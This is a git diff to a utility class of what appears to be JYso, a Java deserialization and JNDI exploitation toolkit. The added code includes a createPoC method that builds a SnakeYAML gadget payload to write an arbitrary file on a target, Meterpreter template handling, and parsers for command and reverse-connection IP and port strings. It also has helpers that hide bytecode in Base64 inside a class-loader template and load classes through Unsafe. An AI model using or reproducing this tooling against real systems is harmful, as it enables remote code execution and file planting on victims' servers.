@@ -1,5 +1,6 @@
 package com.qi4l.JYso.gadgets.utils;
 
+import com.qi4l.JYso.template.echoStatic.Meterpreter;
 import com.sun.org.apache.bcel.internal.classfile.Utility;
 import javassist.CannotCompileException;
 import javassist.ClassPool;
@@ -7,12 +8,12 @@ import javassist.CtClass;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang.StringUtils;
 
-import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FileOutputStream;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
+import java.util.Random;
+import java.util.zip.Deflater;
 import java.util.zip.GZIPOutputStream;
 
 import static com.qi4l.JYso.gadgets.Config.Config.*;
@@ -22,10 +23,10 @@ import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.shrinkBytes;
 
 public class Utils {
 
-    public static Class makeClass(String clazzName) {
+    public static Class<?> makeClass(String clazzName) {
         ClassPool classPool = ClassPool.getDefault();
-        CtClass   ctClass   = classPool.makeClass(clazzName);
-        Class     clazz     = null;
+        CtClass ctClass = classPool.makeClass(clazzName);
+        Class<?> clazz;
         try {
             clazz = ctClass.toClass();
         } catch (CannotCompileException e) {
@@ -36,16 +37,15 @@ public class Utils {
     }
 
     public static String[] handlerCommand(String command) {
-        String info  = command.split("[-]")[1];
-        int    index = info.indexOf("#");
-        String par1  = info.substring(0, index);
-        String par2  = info.substring(index + 1);
+        String info = command.split("-")[1];
+        int index = info.indexOf("#");
+        String par1 = info.substring(0, index);
+        String par2 = info.substring(index + 1);
         return new String[]{par1, par2};
     }
 
-
     public static String base64Decode(String bs) throws Exception {
-        Class  base64;
+        Class<?> base64;
         byte[] value = null;
         try {
             base64 = Class.forName("java.util.Base64");
@@ -60,7 +60,10 @@ public class Utils {
             }
         }
 
-        return new String(value);
+        if (value != null) {
+            return new String(value);
+        }
+        return bs;
     }
 
     public static void saveCtClassToFile(CtClass ctClass) throws Exception {
@@ -80,14 +83,14 @@ public class Utils {
 
     public static void loadClassTest(byte[] classBytes, String className) throws Exception {
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        Method      method      = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
+        Method method = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
         method.setAccessible(true);
-        Class clazz = (Class) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);
+        Class<?> clazz = (Class<?>) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);
 
         try {
             clazz.newInstance();
         } catch (Exception ignored) {
-            Class unsafe         = Class.forName("sun.misc.Unsafe");
+            Class<?> unsafe = Class.forName("sun.misc.Unsafe");
             Field theUnsafeField = unsafe.getDeclaredField("theUnsafe");
             theUnsafeField.setAccessible(true);
             Object unsafeObject = theUnsafeField.get(null);
@@ -110,34 +113,34 @@ public class Utils {
     public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes) throws Exception {
         CtClass ctClass = POOL.get("com.qi4l.JYso.template.ClassLoaderTemplate");
         ctClass.setName(generateClassName());
-        ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
-        GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
+        ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
+        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
         gzipOutputStream.write(bytes);
         gzipOutputStream.close();
 
         String b64 = Base64.encodeBase64String(outBuf.toByteArray());
         // 如果 b64 的长度比较大，则将其切分为多个字符串进行拼接，避免单个字符串过长
-        String code = "";
+        StringBuilder code = new StringBuilder();
         if (b64.length() > 60000) {
             String[] arrays = splitString(b64, 60000);
             for (int i = 0; i < arrays.length; i++) {
                 if (i == 0) {
-                    code += "b64=\"" + arrays[0] + "\";\n";
+                    code.append("b64=\"").append(arrays[0]).append("\";\n");
                 } else {
-                    code += "b64 +=\"" + arrays[i] + "\";\n";
+                    code.append("b64 +=\"").append(arrays[i]).append("\";\n");
                 }
             }
         } else {
-            code += "b64=\"" + b64 + "\";\n";
+            code.append("b64=\"").append(b64).append("\";\n");
         }
 
         // 将赋值的代码插入到 ClassLoaderTemplate 中
-        insertMethod(ctClass, "initClassBytes", code);
+        insertMethod(ctClass, "initClassBytes", code.toString());
         return ctClass;
     }
 
     public static void writeClassToFile(String fileName, byte[] classBytes) throws Exception {
-        File file      = new File(fileName.replace(".", File.separator) + ".class");
+        File file = new File(fileName.replace(".", File.separator) + ".class");
         File parentDir = file.getParentFile();
         if (!parentDir.exists()) {
             if (!parentDir.mkdirs()) {
@@ -155,10 +158,10 @@ public class Utils {
         if (str == null || str.isEmpty() || chunkSize <= 0) {
             return null;
         }
-        int      len      = str.length();
-        int      arrayLen = (len + chunkSize - 1) / chunkSize;
-        String[] result   = new String[arrayLen];
-        int      k        = 0;
+        int len = str.length();
+        int arrayLen = (len + chunkSize - 1) / chunkSize;
+        String[] result = new String[arrayLen];
+        int k = 0;
         for (int i = 0; i < len; i += chunkSize) {
             int endIndex = Math.min(i + chunkSize, len);
             result[k++] = str.substring(i, endIndex);
@@ -166,8 +169,8 @@ public class Utils {
         return result;
     }
 
-    public static String base64Encode(byte[] bs) throws Exception {
-        Class  base64;
+    public static String base64Encode(byte[] bs) {
+        Class<?> base64;
         String value = null;
         try {
             base64 = Class.forName("java.util.Base64");
@@ -178,11 +181,139 @@ public class Utils {
                 base64 = Class.forName("sun.misc.BASE64Encoder");
                 Object Encoder = base64.newInstance();
                 value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
-            } catch (Exception e2) {
+            } catch (Exception ignored) {
             }
         }
         return value;
     }
 
+    public static String getRandomString() {
+        String str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < 10; i++) {
+            char ch = str.charAt(new Random().nextInt(str.length()));
+            sb.append(ch);
+        }
+        return sb.toString();
+    }
 
+    public static String getClassCode(Class<?> clazz) throws Exception {
+        byte[] bytes;
+        if (clazz.getName().equals("com.feihong.ldap.template.Meterpreter")) {
+            bytes = ClassByteChange.update(Meterpreter.class);
+
+        } else {
+            bytes = getClassBytes(clazz);
+        }
+
+
+        return base64Encode(bytes);
+    }
+
+    public static byte[] getClassBytes(Class<?> clazz) throws Exception {
+        String className = clazz.getName();
+        String resourcePath = className.replaceAll("\\.", "/") + ".class";
+        InputStream in = Utils.class.getProtectionDomain().getClassLoader().getResourceAsStream(resourcePath);
+        if (in != null) {
+            return getBytes(in);
+        }
+        return new byte[0];
+    }
+
+    static byte[] getBytes(InputStream in) throws IOException {
+        byte[] bytes = new byte[1024];
+        ByteArrayOutputStream bayous = new ByteArrayOutputStream();
+        int len;
+        while ((len = in.read(bytes)) != -1) {
+            bayous.write(bytes, 0, len);
+        }
+
+        in.close();
+        bayous.close();
+
+        return bayous.toByteArray();
+    }
+
+    public static byte[] serialize(Object ref) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        ObjectOutputStream objOut = new ObjectOutputStream(out);
+        objOut.writeObject(ref);
+        return out.toByteArray();
+    }
+
+    public static String getCmdFromBase(String base) throws Exception {
+        int firstIndex = base.lastIndexOf("/");
+        String cmd = base.substring(firstIndex + 1);
+
+        int secondIndex = base.lastIndexOf("/", firstIndex - 1);
+        if (secondIndex < 0) {
+            secondIndex = 0;
+        }
+
+        if (base.substring(secondIndex + 1, firstIndex).equalsIgnoreCase("base64")) {
+            byte[] bytes = base64Decode(cmd).getBytes();
+            cmd = new String(bytes);
+        }
+
+        return cmd;
+    }
+
+    public static String[] getIPAndPortFromBase(String base) throws NumberFormatException {
+        int firstIndex = base.lastIndexOf("/");
+        String port = base.substring(firstIndex + 1);
+
+        int secondIndex = base.lastIndexOf("/", firstIndex - 1);
+        if (secondIndex < 0) {
+            secondIndex = 0;
+        }
+
+        String ip = base.substring(secondIndex + 1, firstIndex);
+        return new String[]{ip, Integer.parseInt(port) + ""};
+    }
+
+    public static String createPoC(String srcPath, String destPath) throws Exception {
+
+        File file = new File(srcPath);
+        long FileLength = file.length();
+        byte[] FileContent = new byte[(int) FileLength];
+        try {
+            FileInputStream in = new FileInputStream(file);
+            in.read(FileContent);
+            in.close();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
+        byte[] compressBytes = compress(FileContent);
+        return "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\"" + destPath + "\"],false],!!java.util.zip.Inflater  { input: !!binary " + Utils.base64Encode(compressBytes) + " },1048576]]";
+    }
+
+    public static byte[] compress(byte[] data) {
+        byte[] output = new byte[0];
+
+        Deflater compresser = new Deflater();
+
+        compresser.reset();
+        compresser.setInput(data);
+        compresser.finish();
+        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
+        try {
+            byte[] buf = new byte[1024];
+            while (!compresser.finished()) {
+                int i = compresser.deflate(buf);
+                bos.write(buf, 0, i);
+            }
+            output = bos.toByteArray();
+        } catch (Exception e) {
+            output = data;
+            e.printStackTrace();
+        } finally {
+            try {
+                bos.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+        compresser.end();
+        return output;
+    }
 }
